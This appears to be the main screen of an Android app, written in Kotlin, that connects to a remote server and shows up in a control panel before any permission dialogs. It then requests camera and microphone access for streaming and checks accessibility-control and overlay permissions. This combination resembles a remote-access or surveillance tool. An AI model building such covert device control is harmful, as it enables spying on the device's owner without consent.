package com.artem.cameracompanion

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.net.Uri
import android.provider.Settings
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val requestPermissions = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        // Notify service — it will now start camera/audio streams
        StreamingService.start(this)
        updatePermsUi()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        // Connect to server immediately — phone appears in panel before any dialogs
        StreamingService.start(this)
        updatePermsUi()
        requestMissingPermissions()
    }

    override fun onResume() {
        super.onResume()
        updatePermsUi()
    }

    private fun requestMissingPermissions() {
        val needed = buildList {
            if (!has(Manifest.permission.CAMERA)) add(Manifest.permission.CAMERA)
            if (!has(Manifest.permission.RECORD_AUDIO)) add(Manifest.permission.RECORD_AUDIO)
        }
        if (needed.isNotEmpty()) requestPermissions.launch(needed.toTypedArray())
    }

    private fun has(perm: String) =
        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED

    private fun isAccessibilityEnabled(): Boolean {
        val enabled = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.contains(packageName, ignoreCase = true)
    }

    fun updatePermsUi() {
        val tv = findViewById<TextView>(R.id.tvPerms) ?: return
        val cam = if (has(Manifest.permission.CAMERA)) "✓" else "✗"
        val mic = if (has(Manifest.permission.RECORD_AUDIO)) "✓" else "✗"
        val acc = if (isAccessibilityEnabled()) "✓" else "✗"
        val ovr = if (Settings.canDrawOverlays(this)) "✓" else "✗"
        tv.text = "Камера $cam   Микрофон $mic   Упр $acc   Оверлей $ovr"
        if (!Settings.canDrawOverlays(this)) {
            tv.setOnClickListener {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")))
            }
        } else {
            tv.setOnClickListener(null)
        }
    }
}
